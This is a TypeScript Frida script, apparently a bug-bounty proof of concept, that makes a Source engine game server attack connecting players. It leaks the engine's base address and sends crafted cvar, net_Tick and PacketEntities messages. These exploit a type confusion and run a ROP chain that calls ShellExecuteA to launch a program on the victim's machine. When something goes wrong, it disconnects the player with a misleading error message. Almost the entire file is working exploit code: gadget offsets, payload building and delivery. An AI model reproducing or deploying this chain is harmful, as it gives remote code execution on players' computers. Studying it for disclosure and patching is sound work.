import MapInfoLeak from './infoleak';
import bf_write from './source_engine/classes/bf_write'
import CBaseClient from './source_engine/classes/cgameclient'
import CNetChan from './source_engine/classes/cnetchan'
import se from './source_engine/index'
import hackerone from './source_engine/hackerone';
import CGameClient from './source_engine/classes/cgameclient';

let net_SetConVar = 5;
let svc_PacketEntities = 26;
let net_Tick = 3;
let NETMSG_BITS = 6;

// craft a packet to replicate a cvar using net_ConVar netmessage
function ReplicateCVar(bf: bf_write, name: string, value: string) {
    bf.WriteUBitLong(net_SetConVar, NETMSG_BITS)
    bf.WriteByte(1)
    bf.WriteString(name)
    bf.WriteString(value)
}

// craft net_Tick to change the value of m_ClientGlobalVariables->tickcount
function SetClientTick(bf: bf_write, value: NativePointer) {
    bf.WriteUBitLong(net_Tick, NETMSG_BITS)

    // Tick count (Stored in m_ClientGlobalVariables->tickcount)
    bf.WriteLong(value.toInt32())

    // Write m_flHostFrameTime
    bf.WriteUBitLong(1, 16);

    // Write m_flHostFrameTimeStdDeviation
    bf.WriteUBitLong(1, 16);
}

// craft the netmessage for the PacketEntities exploit
function SendExploit_PacketEntities(bf: bf_write, offset: number) {
    bf.WriteUBitLong(svc_PacketEntities, NETMSG_BITS)

    // Max entries
    bf.WriteUBitLong(0, 11)

    // Is Delta?
    bf.WriteBit(0)

    // DeltaFrom=?
    // bf.WriteUBitLong(0, 32)

    // Baseline?
    bf.WriteBit(0)

    // # of updated entries?
    bf.WriteUBitLong(1, 11)

    // Length of update packet?
    bf.WriteUBitLong(55, 20)

    // Update baseline?
    bf.WriteBit(0)

    // Data_in after here
    bf.WriteUBitLong(3, 2) // our data_in is of type 32-bit integer

    // >>>>>>>>>>>>>>>>>>>> The out of bounds type confusion is here <<<<<<<<<<<<<<<<<<<<
    bf.WriteUBitLong(offset, 32)

    // enterpvs flag
    bf.WriteBit(0)

    // zero for the rest of the packet
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
    bf.WriteUBitLong(0, 32)
}

function XorEdxEdxRet(engineBase: NativePointer) {
    return engineBase.add(0x2a5ccc)
}

function PopEbxRet(engineBase: NativePointer) {
    return engineBase.add(0x3d87)
}

function IncEbxRet(engineBase: NativePointer) {
    return engineBase.add(0x8e4d9)
}

function PopEaxRet(engineBase: NativePointer) {
    return engineBase.add(0x4d845)
}

function PopEcxRet(engineBase: NativePointer) {
    return engineBase.add(0x359fa)
}

function DerefEcxIntoEaxRet(engineBase: NativePointer) {
    return engineBase.add(0x1c4210)
}

// neg edx; sbb dl, dl; lea eax, [edx + 1]; pop ebp; ret; 
function NegEdxPopEbpRet(engineBase: NativePointer) {
    return engineBase.add(0x2b97d1)
}

function PopEdxRet(engineBase: NativePointer) {
    return engineBase.add(0x1ee2c2)
}

function NegEaxRet(engineBase: NativePointer) {
    return engineBase.add(0x14a6f9)
}

function XchgEaxEbxRet(engineBase: NativePointer) {
    return engineBase.add(0x177ec9)
}

function IATForShellExecuteA(engineBase: NativePointer) {
    return engineBase.add(0x2D823C)
}

function XchgEaxEsiRet(engineBase: NativePointer) {
    return engineBase.add(0x17d036)
}

function PushEaxPopEdiPopEbxPopEbpRet(engineBase: NativePointer) {
    return engineBase.add(0x221e1d)
}

function IncEbpRet(engineBase: NativePointer) {
    return engineBase.add(0xacfbb)
}

function NegEcxClobberEaxRet(engineBase: NativePointer) {
    return engineBase.add(0x23992c)
}

// 0x100d4c3e: xchg eax, ecx; pop esi; pop edi; pop ebp; ret;
function XchgEaxEcxPopEsiPopEdiPopEbpRet(engineBase: NativePointer) {
    return engineBase.add(0xd4c3e)
}

function PushalRet(engineBase: NativePointer) {
    return engineBase.add(0x1b9793)
}

function DecEcxRet(engineBase: NativePointer) {
    return engineBase.add(0xbc49c)
}


// globally controllable value using net_Tick
let tickcount_offset = se.util.require_offset("g_ClientGlobalVariables").add(0x18)

// a replicated cvar value that we know
let svdownloadurl_mpzstring_offset = se.util.require_offset("sv_downloadurl").add(36)

function postLeak(engineBase: NativePointer | null) {
    if (engineBase === null) {
        console.log("leak failed")
        return;
    }

    console.log("Using engine base: " + engineBase)

    let client = CBaseClient.GetClientByIndex(0)
    if (client.pointer.isNull()) {
        console.log("ERROR: A player must be connected to the server! Please restart the script after a player has connected.")
        return;
    }
    let netchannel = client.GetNetChannel() as CNetChan
    if (netchannel.pointer.isNull()) {
        console.log("ERROR: A player must be connected to the server! Please restart the script after a player has connected.")
        return;
    }

    console.log("Sending exploit to player...")

    // the stack pivot gadget in engine that we want to call
    let stackPivotGadget = engineBase?.add(0x261683)
    //console.log("stackPivotGadget: " + stackPivotGadget)

    // absolute pointer to the remote engine.dll's tickcount
    let tickcount_remote_addr = engineBase.add(tickcount_offset)

    // allows us to execute the value at this address
    let derefToCall = new NativePointer(tickcount_remote_addr);

    // generate the ROP chain
    let origpayload = Memory.alloc(1024);
    let payload = origpayload;
    payload = payload.writePointer(derefToCall.sub(0x18)).add(4)

    // padding for stack pivot
    payload = payload.writeU32(0xDEADBEEF).add(4) // EBX
    payload = payload.writeU32(0xDEADBEEF).add(4) // ESI
    // ECX+4 == beginning of our payload


    /*
    HINSTANCE ShellExecuteA(
    HWND   hwnd,
    LPCSTR lpOperation,
    LPCSTR lpFile,
    LPCSTR lpParameters,
    LPCSTR lpDirectory,
    INT    nShowCmd
    );
    
    EDI = &ShellExecuteA
    ESI = [Return Address]
    EBP = hWnd
    Temp = lpOperation
    EBX = lpFile
    EDX = lpParameters
    ECX = lpDirectory
    EAX = nShowCmd

    */


    // &ShellExecuteA => EDI
    // ------------------------------------------

    // ECX = &&ShellExecuteA
    payload = payload.writePointer(PopEcxRet(engineBase)).add(4)
    payload = payload.writePointer(IATForShellExecuteA(engineBase)).add(4)

    // EAX = *(ECX)
    // EAX = &ShellExecuteA
    payload = payload.writePointer(DerefEcxIntoEaxRet(engineBase)).add(4)

    // EDI = EAX
    // EBX = ~1
    // EBP = ~1
    payload = payload.writePointer(PushEaxPopEdiPopEbxPopEbpRet(engineBase)).add(4)
    payload = payload.writeU32(0xFFFFFFFF).add(4)
    payload = payload.writeU32(0xFFFFFFFF).add(4)

    // EBP = 0
    payload = payload.writePointer(IncEbpRet(engineBase)).add(4)

    // EDX = 0
    payload = payload.writePointer(XorEdxEdxRet(engineBase)).add(4)

    // Resolve a pointer to the string contents of sv_downloadurl, which contains the file we want to execute
    // ECX = &&FileToExecute
    payload = payload.writePointer(PopEcxRet(engineBase)).add(4)
    payload = payload.writePointer(engineBase.add(svdownloadurl_mpzstring_offset)).add(4)

    // EAX = *(ECX)
    // EAX = &FileToExecute
    payload = payload.writePointer(DerefEcxIntoEaxRet(engineBase)).add(4)

    // EBX = EAX
    payload = payload.writePointer(XchgEaxEbxRet(engineBase)).add(4)

    // ECX = ~1
    payload = payload.writePointer(PopEcxRet(engineBase)).add(4)
    payload = payload.writeU32(0xFFFFFFFF).add(4)

    // ECX = 1
    payload = payload.writePointer(NegEcxClobberEaxRet(engineBase)).add(4)

    // ECX -= 1, ECX = 0
    payload = payload.writePointer(DecEcxRet(engineBase)).add(4)

    // EAX = ~5 (SW_SHOW)
    payload = payload.writePointer(PopEaxRet(engineBase)).add(4)
    payload = payload.writeU32(0xFFFFFFFF - 4).add(4)

    // EAX = 5 (SW_SHOW)
    payload = payload.writePointer(NegEaxRet(engineBase)).add(4)

    // pushal; ret
    payload = payload.writePointer(PushalRet(engineBase)).add(4)

    payload = payload.writeU32(0x6e65706f).add(4)
    payload = payload.writeU32(0x00000000).add(4)

    // MUST be readAnsiString or it will do unicode character replacement!!
    let stringVal = origpayload.readAnsiString()
    if (stringVal === null) {
        console.log("payload gen failed")
        return;
    }

    console.log("Chain length: " + stringVal.length)

    if (stringVal.length != 96) {
        console.log("[!!!] Scared of a lucky ASLR base, not exploiting.")
        netchannel.Shutdown(Memory.allocAnsiString("Something went wrong while connecting, please restart your system and try again"))
        return
    }
    let payloadbuf = bf_write.Create(2048)


    // Need to send the program we want to execute somewhere we can locate a pointer to
    ReplicateCVar(payloadbuf, "sv_downloadurl", "C:/Windows/System32/winver.exe")

    // The fake object pointer and the ROP chain are stored in this cvar
    ReplicateCVar(payloadbuf, "sv_mumble_positionalaudio", stringVal)

    // Set a known location inside of engine.dll so we can access it.
    SetClientTick(payloadbuf, new NativePointer(stackPivotGadget))

    // The exploit for type-confusion in PacketEntities to begin the arbitrary code execution
    SendExploit_PacketEntities(payloadbuf, 0x26DA)

    // Send the above netmessages to the player
    netchannel.SendData(payloadbuf.pointer, 1)

    console.log("Payload successfully sent.")

}

let SIGNONSTATE_FULL = 6;

MapInfoLeak.attachInterceptors()

// Hook when new clients are connecting and wait for them to spawn in
let signonstate_fn = se.util.require_symbol("CGameClient::ProcessSignonStateMsg")
Interceptor.attach(signonstate_fn, {
    onEnter(args) {
        console.log("Signon state: " + args[0].toInt32())

        // Check to make sure they're fully spawned in
        let stateNumber = args[0].toInt32()
        if (stateNumber != SIGNONSTATE_FULL) { return; }

        // give their client a bit of time to load in, if it's slow.
        Thread.sleep(1)

        // Get the CGameClient instance, then get their netchannel
        let thisptr = (this.context as Ia32CpuContext).ecx;
        let asNetChan = new CGameClient(thisptr.add(0x4)).GetNetChannel() as CNetChan;
        if (asNetChan.pointer.isNull()) {
            console.log("[!] Could not get CNetChan for player!")
            return;
        }

        // Begin the leak, and eventually the exploit
        let leak = new MapInfoLeak(asNetChan, postLeak);
        leak.startLeakingFile();
    }
})